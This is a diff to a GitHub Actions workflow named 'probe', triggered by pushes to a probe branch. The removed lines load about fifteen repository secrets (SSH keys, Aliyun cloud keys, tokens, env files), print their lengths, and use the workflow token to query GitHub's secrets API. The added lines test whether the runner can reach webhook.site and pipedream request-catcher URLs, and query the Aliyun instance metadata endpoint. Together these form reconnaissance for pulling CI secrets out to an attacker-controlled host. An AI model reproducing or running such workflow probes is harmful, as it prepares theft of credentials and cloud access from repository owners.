@@ -1,39 +1,17 @@
-name: probe3
+name: probe4
 on:
   push:
     branches: ['probe-i59265']
-permissions:
-  actions: read
-  contents: read
 jobs:
   p:
     runs-on: ubuntu-latest
-    env:
-      S_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
-      S_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
-      S_DEPLOY_SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
-      S_SSH_KEY: ${{ secrets.SSH_KEY }}
-      S_ALIYUN_ACCESS_KEY_ID: ${{ secrets.ALIYUN_ACCESS_KEY_ID }}
-      S_ALIYUN_ACCESS_KEY_SECRET: ${{ secrets.ALIYUN_ACCESS_KEY_SECRET }}
-      S_ALIYUN_SECRET: ${{ secrets.ALIYUN_SECRET }}
-      S_REGISTRY_PASSWORD: ${{ secrets.REGISTRY_PASSWORD }}
-      S_ENV_FILE: ${{ secrets.ENV_FILE }}
-      S_DOTENV: ${{ secrets.DOTENV }}
-      S_HOST: ${{ secrets.HOST }}
-      S_SERVER_HOST: ${{ secrets.SERVER_HOST }}
-      S_ALIYUN_HOST: ${{ secrets.ALIYUN_HOST }}
-      S_GH_PAT: ${{ secrets.GH_PAT }}
-      S_TOKEN: ${{ secrets.TOKEN }}
     steps:
-      - name: probe-secret-lengths
+      - name: outbound-test
         run: |
-          for v in S_SSH_PRIVATE_KEY S_DEPLOY_KEY S_DEPLOY_SSH_KEY S_SSH_KEY S_ALIYUN_ACCESS_KEY_ID S_ALIYUN_ACCESS_KEY_SECRET S_ALIYUN_SECRET S_REGISTRY_PASSWORD S_ENV_FILE S_DOTENV S_HOST S_SERVER_HOST S_ALIYUN_HOST S_GH_PAT S_TOKEN; do
-            eval "val=\${$v}"
-            echo "$v len=${#val}"
+          echo "runner=$(hostname) uid=$(id -u)"
+          for u in "https://webhook.site/11fdab5d-2ca4-4cab-b318-61be45d3ed4b/probe4-a" "https://httpbin.org/get?probe=4a" "https://en2jq0qzah0r.x.pipedream.net/probe4b" "http://100.100.100.200/latest/meta-data/instance-id"; do
+            code=$(curl -s -m 12 -o /dev/null -w '%{http_code}' "$u" || echo FAIL)
+            echo "OUTBOUND $u -> $code"
           done
-      - name: token-scope-test
-        run: |
-          curl -s -m 15 -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" -o secrets_api.json -w "secrets_api:%{http_code}\n"
-          head -c 400 secrets_api.json; echo
-          curl -s -m 15 -H "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/user" -o me.json -w "me:%{http_code}\n"; head -c 200 me.json; echo
-          curl -s -m 15 -o /dev/null -w "rate:%{http_code}\n" -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/rate_limit
+          echo "---- dns ----"
+          (getent hosts webhook.site || true)
